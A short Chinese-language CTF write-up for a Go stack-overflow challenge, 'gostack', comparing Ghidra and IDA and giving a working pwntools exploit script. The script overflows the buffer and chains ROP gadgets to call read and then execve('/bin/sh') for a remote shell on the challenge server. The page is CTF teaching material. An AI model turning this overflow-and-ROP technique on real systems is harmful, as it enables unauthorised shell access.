# gostack
一道go语言的栈溢出题目
这种情况下可以看出ghidra和ida的一些区别，ghidra无法识别到函数的符号名称，但ida可以至少识别出函数的名称来帮助理解分析。
这题有两种解法，第一种是func2直接是后门函数，栈溢出直接执行func2就可以getshell，但虽然func2有一个执行executeCommand的命令，的我没看出这个参数是怎么设定的来可以getshell。
第二种就是通过gadgets来构造rop链，这个不是很难，直接构造即可
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './'
if local:
    p = process(elf_path)
else:
    ip, port = 'pwn.challenge.ctf.show:28292'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b *0x4a0ac0
            b *0x4a0520
            b *0x4a05a0
            b *0x4a0880
            b *0x4a09d8
            b *0x4a0a28
        ''')

# debug()
def exp1():
    payload = b'\x00' * (0x1c8 + 8) + p64(0x4a0af6)
    p.sendlineafter(b'message :', payload)

def exp2():
    bss=0x563C52
    syscall_ret=0x4616c9
    pop_rdi_r14_r13_r12_rbp_rbx= 0x4a18a5
    pop_rsi= 0x42138a
    pop_rdx= 0x4944ec
    pop_rax= 0x40f984

    payload = b'\x00' * (0x1c8+8)
    payload += p64(pop_rdi_r14_r13_r12_rbp_rbx) + p64(0)*6
    payload += p64(pop_rsi) + p64(bss)
    payload += p64(pop_rdx) + p64(8)
    payload += p64(pop_rax) + p64(0)
    payload += p64(syscall_ret)  #read(0,bss,8)

    payload += p64(pop_rax) + p64(59)
    payload += p64(pop_rdi_r14_r13_r12_rbp_rbx) + p64(bss) + p64(0) * 5
    payload += p64(pop_rsi) + p64(0)
    payload += p64(pop_rdx) + p64(0)
    payload += p64(syscall_ret)   #exceve('bin/sh',0,0)

    p.recv()
    p.sendline(payload)
    p.sendline(b'/bin/sh\x00')

exp2()
p.interactive()


```
# orange_cat_diary
